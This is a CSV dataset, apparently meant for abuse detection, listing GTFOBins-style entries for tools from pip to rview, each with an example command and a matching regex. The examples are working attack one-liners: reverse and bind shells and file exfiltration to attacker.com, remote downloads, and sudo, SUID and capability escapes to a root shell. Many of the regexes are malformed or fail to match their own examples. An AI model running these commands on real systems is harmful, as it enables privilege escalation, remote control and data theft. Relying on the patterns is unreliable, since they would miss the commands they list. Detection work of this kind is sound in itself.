Name,Function,ExampleCode,Regex
pip,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
pip install $TF",(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+.*)
pip,file-upload,"export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
pip install $TF",(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+.*socket)
pip,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' > $TF/setup.py
pip install $TF",(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+.*)
pip,file-write,"export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""open('$LFILE','w+').write('DATA')"" > $TF/setup.py
pip install $TF",(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+.*)
pip,file-read,"echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py
pip install $TF",(?i)(?:sudo\s+)?(?:\S*/)?pip\s+.*)
pip,library-load,"echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
pip install $TF",(?i)(?:sudo\s+)?(?:\S*/)?pip\s+.*)
pip,sudo,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
sudo pip install $TF",(?i)(?:sudo\s+)?(?:\S*/)?pip\s+.*/bin/sh)
pkexec,sudo,sudo pkexec /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?pkexec\s+.*/bin/sh)
pkg,sudo,sudo pkg install -y --no-repo-update ./x-1.0.txz,(?i)(?:sudo\s+)?(?:\S*/)?pkg\s*\-y\s+.*)
posh,shell,posh,(?i)(?:sudo\s+)?(?:\S*/)?posh\s+.*)
posh,limited-suid,./posh,(?i)(?:sudo\s+)?(?:\S*/)?posh\s+.*)
posh,sudo,sudo posh,(?i)(?:sudo\s+)?(?:\S*/)?posh\s+.*)
pr,file-read,pr -T $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?pr\s*\-T\s+.*)
pr,suid,pr -T $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?pr\s*\-T\s+.*)
pr,sudo,pr -T $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?pr\s*\-T\s+.*)
pry,shell,"pry
system(""/bin/sh"")","(?i)(?:sudo\s+)?(?:\S*/)?pry\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
pry,sudo,"sudo pry
system(""/bin/sh"")","(?i)(?:sudo\s+)?(?:\S*/)?pry\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
pry,limited-suid,"./pry
system(""/bin/sh"")","(?i)(?:sudo\s+)?(?:\S*/)?pry\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
psftp,shell,"psftp
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?psftp\s+.*/bin/sh)
psftp,limited-suid,"sudo psftp
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?psftp\s+.*/bin/sh)
psftp,sudo,"sudo psftp
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?psftp\s+.*/bin/sh)
psql,shell,"psql
\?
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?psql\s+.*/bin/sh)
psql,sudo,"psql
\?
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?psql\s+.*/bin/sh)
ptx,file-read,"ptx -w 5000 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ptx\s*\-w\s+.*)
ptx,suid,"./ptx -w 5000 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ptx\s*\-w\s+.*)
ptx,sudo,"sudo ptx -w 5000 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ptx\s*\-w\s+.*)
puppet,shell,"puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""",(?i)(?:sudo\s+)?(?:\S*/)?puppet\s*\-e\s*\-c\s*\-i\s+.*/bin/sh)
puppet,file-write,"puppet apply -e ""file { '$LFILE': content => 'DATA' }""",(?i)(?:sudo\s+)?(?:\S*/)?puppet\s*\-e\s+.*)
puppet,file-read,puppet filebucket -l diff /dev/null $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?puppet\s*\-l\s+.*)
puppet,sudo,"sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""",(?i)(?:sudo\s+)?(?:\S*/)?puppet\s*\-e\s*\-c\s*\-i\s+.*/bin/sh)
pwsh,shell,pwsh,(?i)(?:sudo\s+)?(?:\S*/)?pwsh\s+.*)
pwsh,file-write,"export LFILE=file_to_write
pwsh -c '""DATA"" | Out-File $env:LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?pwsh\s*\-c\s+.*)
pwsh,sudo,sudo pwsh,(?i)(?:sudo\s+)?(?:\S*/)?pwsh\s+.*)
python,shell,"python -c 'import os; os.system(""/bin/sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
python,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
python,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'",(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*)
python,file-upload,"export LPORT=8888
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'",(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*socket)
python,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'",(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*)
python,file-write,"python -c 'open(""file_to_write"",""w+"").write(""DATA"")'",(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*)
python,file-read,"python -c 'print(open(""file_to_read"").read())'",(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*)
python,library-load,"python -c 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'",(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*)
python,suid,"./python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*/bin/sh)
python,sudo,"sudo python -c 'import os; os.system(""/bin/sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
python,capabilities,"./python -c 'import os; os.setuid(0); os.system(""/bin/sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
rake,file-read,rake -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?rake\s*\-f\s+.*)
rake,shell,rake -p '`/bin/sh 1>&0`',(?i)(?:sudo\s+)?(?:\S*/)?rake\s*\-p\s+.*/bin/sh)
rake,sudo,sudo rake -p '`/bin/sh 1>&0`',(?i)(?:sudo\s+)?(?:\S*/)?rake\s*\-p\s+.*/bin/sh)
rake,limited-suid,./rake -p '`/bin/sh 1>&0`',(?i)(?:sudo\s+)?(?:\S*/)?rake\s*\-p\s+.*/bin/sh)
rc,shell,rc -c '/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?rc\s*\-c\s+.*/bin/sh)
rc,suid,./rc -c '/bin/sh -p',(?i)(?:sudo\s+)?(?:\S*/)?rc\s*\-c\s*\-p\s+.*/bin/sh)
rc,sudo,sudo rc -c '/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?rc\s*\-c\s+.*/bin/sh)
readelf,file-read,readelf -a @$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?readelf\s*\-a\s+.*)
readelf,suid,./readelf -a @$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?readelf\s*\-a\s+.*)
readelf,sudo,sudo readelf -a @$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?readelf\s*\-a\s+.*)
red,file-write,"red file_to_write
a
DATA
.
w
q",(?i)(?:sudo\s+)?(?:\S*/)?red\s+.*)
red,file-read,"red file_to_read
,p
q",(?i)(?:sudo\s+)?(?:\S*/)?red\s+.*)
red,sudo,"sudo red file_to_write
a
DATA
.
w
q",(?i)(?:sudo\s+)?(?:\S*/)?red\s+.*)
redcarpet,file-read,"redcarpet ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?redcarpet\s+.*)
redcarpet,sudo,"sudo redcarpet ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?redcarpet\s+.*)
redis,file-write,"redis-cli -h $IP
config set dir dir_to_write_to
config set dbfilename file_to_write
set x ""DATA""
save",(?i)(?:sudo\s+)?(?:\S*/)?redis\s*\-h\s+.*)
restic,file-upload,"restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?restic\s*\-r\s+.*)
restic,sudo,"sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?restic\s*\-r\s+.*)
restic,suid,"./restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?restic\s*\-r\s+.*)
rev,file-read,rev $LFILE | rev,(?i)(?:sudo\s+)?(?:\S*/)?rev\s+.*)
rev,suid,./rev $LFILE | rev,(?i)(?:sudo\s+)?(?:\S*/)?rev\s+.*)
rev,sudo,sudo rev $LFILE | rev,(?i)(?:sudo\s+)?(?:\S*/)?rev\s+.*)
rlogin,file-upload,"rlogin -l ""$(cat $LFILE)"" -p $RPORT $RHOST",(?i)(?:sudo\s+)?(?:\S*/)?rlogin\s*\-l\s*\-p\s+.*)
rlwrap,shell,rlwrap /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?rlwrap\s+.*/bin/sh)
rlwrap,file-write,"rlwrap -l ""$LFILE"" echo DATA",(?i)(?:sudo\s+)?(?:\S*/)?rlwrap\s*\-l\s+.*)
rlwrap,suid,./rlwrap -H /dev/null /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?rlwrap\s*\-H\s*\-p\s+.*/bin/sh)
rlwrap,sudo,sudo rlwrap /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?rlwrap\s+.*/bin/sh)
rpm,shell,"rpm --eval '%{lua:os.execute(""/bin/sh"")}'",(?i)(?:sudo\s+)?(?:\S*/)?rpm\s+.*/bin/sh)
rpm,shell,rpm --pipe '/bin/sh 0<&1',(?i)(?:sudo\s+)?(?:\S*/)?rpm\s+.*/bin/sh)
rpm,limited-suid,"./rpm --eval '%{lua:os.execute(""/bin/sh"")}'",(?i)(?:sudo\s+)?(?:\S*/)?rpm\s+.*/bin/sh)
rpm,sudo,"sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'",(?i)(?:sudo\s+)?(?:\S*/)?rpm\s+.*/bin/sh)
rpm,sudo,sudo rpm -ivh x-1.0-1.noarch.rpm,(?i)(?:sudo\s+)?(?:\S*/)?rpm\s+.*)
rpmdb,shell,rpmdb --eval '%(/bin/sh 1>&2)',(?i)(?:sudo\s+)?(?:\S*/)?rpmdb\s+.*/bin/sh)
rpmdb,limited-suid,./rpmdb --eval '%(/bin/sh 1>&2)',(?i)(?:sudo\s+)?(?:\S*/)?rpmdb\s+.*/bin/sh)
rpmdb,sudo,sudo rpmdb --eval '%(/bin/sh 1>&2)',(?i)(?:sudo\s+)?(?:\S*/)?rpmdb\s+.*/bin/sh)
rpmquery,shell,"rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","(?i)(?:sudo\s+)?(?:\S*/)?rpmquery\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
rpmquery,limited-suid,"./rpmquery --eval '%{lua:os.execute(""/bin/sh"")}'",(?i)(?:sudo\s+)?(?:\S*/)?rpmquery\s+.*/bin/sh)
rpmquery,sudo,"sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","(?i)(?:sudo\s+)?(?:\S*/)?rpmquery\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
rpmverify,shell,rpmverify --eval '%(/bin/sh 1>&2)',(?i)(?:sudo\s+)?(?:\S*/)?rpmverify\s+.*/bin/sh)
rpmverify,limited-suid,./rpmverify --eval '%(/bin/sh 1>&2)',(?i)(?:sudo\s+)?(?:\S*/)?rpmverify\s+.*/bin/sh)
rpmverify,sudo,sudo rpmverify --eval '%(/bin/sh 1>&2)',(?i)(?:sudo\s+)?(?:\S*/)?rpmverify\s+.*/bin/sh)
rsync,shell,"rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",(?i)(?:sudo\s+)?(?:\S*/)?rsync\s*\-e\s*\-c\s+.*)
rsync,sudo,"sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",(?i)(?:sudo\s+)?(?:\S*/)?rsync\s*\-e\s*\-c\s+.*)
rsync,suid,"./rsync -e 'sh -p -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",(?i)(?:sudo\s+)?(?:\S*/)?rsync\s*\-e\s*\-p\s*\-c\s+.*)
rtorrent,shell,"echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
rtorrent",(?i)(?:sudo\s+)?(?:\S*/)?rtorrent\s+.*/bin/sh)
rtorrent,suid,"echo ""execute = /bin/sh,-p,-c,\""/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
./rtorrent",(?i)(?:sudo\s+)?(?:\S*/)?rtorrent\s*\-p\s+.*/bin/sh)
ruby,shell,"ruby -e 'exec ""/bin/sh""'",(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+.*/bin/sh)
ruby,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'","(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
ruby,file-upload,"export LPORT=8888
ruby -run -e httpd . -p $LPORT",(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s*\-p\s+.*)
ruby,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
ruby -e 'require ""open-uri""; download = open(ENV[""URL""]); IO.copy_stream(download, ENV[""LFILE""])'",(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+.*)
ruby,file-write,"ruby -e 'File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }'",(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+.*)
ruby,file-read,"ruby -e 'puts File.read(""file_to_read"")'",(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+.*)
ruby,library-load,"ruby -e 'require ""fiddle""; Fiddle.dlopen(""lib.so"")'",(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+.*)
ruby,sudo,"sudo ruby -e 'exec ""/bin/sh""'",(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+.*/bin/sh)
ruby,capabilities,"./ruby -e 'Process::Sys.setuid(0); exec ""/bin/sh""'",(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+.*/bin/sh)
run-mailcap,shell,"run-mailcap --action=view /etc/hosts
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?run\-mailcap\s+.*/bin/sh)
run-mailcap,file-read,run-mailcap --action=view file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?run\-mailcap\s+.*)
run-mailcap,file-write,run-mailcap --action=edit file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?run\-mailcap\s+.*)
run-mailcap,sudo,"sudo run-mailcap --action=view /etc/hosts
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?run\-mailcap\s+.*/bin/sh)
run-parts,shell,run-parts --new-session --regex '^sh$' /bin,(?i)(?:sudo\s+)?(?:\S*/)?run\-parts\s+.*)
run-parts,sudo,sudo run-parts --new-session --regex '^sh$' /bin,(?i)(?:sudo\s+)?(?:\S*/)?run\-parts\s+.*)
run-parts,suid,./run-parts --new-session --regex '^sh$' /bin --arg='-p',(?i)(?:sudo\s+)?(?:\S*/)?run\-parts\s+.*)
runscript,shell,"echo '! exec /bin/sh' >$TF
runscript $TF",(?i)(?:sudo\s+)?(?:\S*/)?runscript\s+.*/bin/sh)
runscript,limited-suid,"echo '! exec /bin/sh' >$TF
./runscript $TF",(?i)(?:sudo\s+)?(?:\S*/)?runscript\s+.*/bin/sh)
runscript,sudo,"echo '! exec /bin/sh' >$TF
sudo runscript $TF",(?i)(?:sudo\s+)?(?:\S*/)?runscript\s+.*/bin/sh)
rview,shell,"rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*/bin/sh)
rview,shell,"rview -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*)
rview,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
rview,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
rview -c ':lua local s=require(""socket""); local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
rview,non-interactive-bind-shell,"export LPORT=12345
rview -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
rview,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*)
rview,file-upload,"export LPORT=8888
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*socket)
rview,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
rview -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
rview,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'",(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*)
rview,file-download,"export LPORT=12345
export LFILE=file_to_save
rview -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
rview,file-write,"rview file_to_write
iDATA
^[
w!",(?i)(?:sudo\s+)?(?:\S*/)?rview\s+.*)
rview,file-read,rview file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?rview\s+.*)
